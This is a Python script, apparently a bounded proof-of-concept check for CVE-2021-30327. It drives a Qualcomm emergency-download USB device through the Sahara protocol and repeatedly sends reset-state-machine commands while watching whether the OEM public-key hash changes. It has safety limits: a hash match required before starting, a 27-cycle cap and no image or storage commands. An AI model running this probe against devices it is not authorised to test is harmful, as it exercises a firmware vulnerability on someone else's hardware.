#!/usr/bin/env python3
"""Bounded CVE-2021-30327 Sahara reset/hash check; stops after cycle 27."""

import struct

import usb.backend.libusb1
import usb.core
import usb.util


VID = 0x05C6
PID = 0x9008
TIMEOUT_MS = 3000
MAX_CYCLES = 27
EXPECTED_PK_HASH = "7291ef5c5d99dc05ee00237a1d71b1f572696870b839bb715fba9e89988b4a3f"

HELLO = 0x01
HELLO_RESP = 0x02
CMD_READY = 0x0B
CMD_EXEC = 0x0D
CMD_EXEC_RESP = 0x0E
CMD_EXEC_DATA = 0x0F
RESET_STATE_MACHINE = 0x13
COMMAND_MODE = 0x03
OEM_PK_HASH_READ = 0x03


def packet(cmd, *fields):
    return struct.pack("<" + "I" * (2 + len(fields)), cmd, 8 + 4 * len(fields), *fields)


def read_packet(endpoint, size):
    return bytes(endpoint.read(size, timeout=TIMEOUT_MS))


def get_pk_hash(ep_in, ep_out):
    ep_out.write(packet(CMD_EXEC, OEM_PK_HASH_READ), timeout=TIMEOUT_MS)
    response = read_packet(ep_in, 0x10)
    if len(response) < 12 or struct.unpack_from("<I", response)[0] != CMD_EXEC_RESP:
        raise RuntimeError(f"unexpected EXEC response: {response.hex()}")

    ep_out.write(packet(CMD_EXEC_DATA, OEM_PK_HASH_READ), timeout=TIMEOUT_MS)
    raw = read_packet(ep_in, 0x60)
    if len(raw) < 32:
        raise RuntimeError(f"short OEM PK hash response ({len(raw)} bytes): {raw.hex()}")

    marker = raw[:4]
    duplicate = raw[4:].find(marker)
    if duplicate >= 0:
        raw = raw[:4 + duplicate]
    return raw.hex()


def enter_command_mode(ep_in, ep_out):
    hello = read_packet(ep_in, 0x30)
    if len(hello) < 24 or struct.unpack_from("<I", hello)[0] != HELLO:
        raise RuntimeError(f"expected HELLO; received {hello.hex()}")
    _, _, version, version_min, max_packet, mode = struct.unpack_from("<6I", hello)

    hello_response = struct.pack(
        "<12I",
        HELLO_RESP,
        0x30,
        version,
        version_min,
        0,
        COMMAND_MODE,
        0,
        0,
        0,
        0,
        0,
        0,
    )
    ep_out.write(hello_response, timeout=TIMEOUT_MS)

    ready = read_packet(ep_in, 0x08)
    if len(ready) < 8 or struct.unpack_from("<I", ready)[0] != CMD_READY:
        raise RuntimeError(f"expected CMD_READY; received {ready.hex()}")
    return version, version_min, max_packet, mode


def main():
    backend = usb.backend.libusb1.get_backend()
    if backend is None:
        raise SystemExit("libusb backend unavailable; no device command sent")

    dev = usb.core.find(idVendor=VID, idProduct=PID, backend=backend)
    if dev is None:
        raise SystemExit("05c6:9008 not present; no device command sent")

    try:
        dev.set_configuration()
        intf = dev.get_active_configuration()[(0, 0)]
        ep_out = usb.util.find_descriptor(
            intf,
            custom_match=lambda ep: usb.util.endpoint_direction(ep.bEndpointAddress)
            == usb.util.ENDPOINT_OUT,
        )
        ep_in = usb.util.find_descriptor(
            intf,
            custom_match=lambda ep: usb.util.endpoint_direction(ep.bEndpointAddress)
            == usb.util.ENDPOINT_IN,
        )
        if ep_in is None or ep_out is None:
            raise RuntimeError("Sahara bulk endpoints not found")

        version, version_min, max_packet, mode = enter_command_mode(ep_in, ep_out)
        print(
            f"HELLO version={version} min={version_min} max_packet={max_packet} "
            f"mode={mode}; bounded cycles=1..{MAX_CYCLES}"
        )
        baseline = get_pk_hash(ep_in, ep_out)
        print(f"baseline_oem_pk_hash={baseline}")
        if baseline != EXPECTED_PK_HASH:
            raise RuntimeError(
                "OEM PK hash does not match the recorded Portal identity; "
                "stopping before sending reset-state-machine commands"
            )

        for cycle in range(1, MAX_CYCLES + 1):
            ep_out.write(bytes([RESET_STATE_MACHINE]), timeout=TIMEOUT_MS)
            version, version_min, max_packet, mode = enter_command_mode(ep_in, ep_out)
            pk_hash = get_pk_hash(ep_in, ep_out)
            changed = pk_hash != baseline
            print(f"cycle={cycle} oem_pk_hash={pk_hash} changed_from_baseline={changed}")

            if changed:
                print("Hash changed; stopping immediately at this cycle.")
                break
            if cycle in (26, 27):
                print(f"boundary_snapshot_{cycle}={pk_hash}")

        print("Stopped at the bounded limit; no image or storage commands were sent.")
    finally:
        usb.util.dispose_resources(dev)


if __name__ == "__main__":
    main()
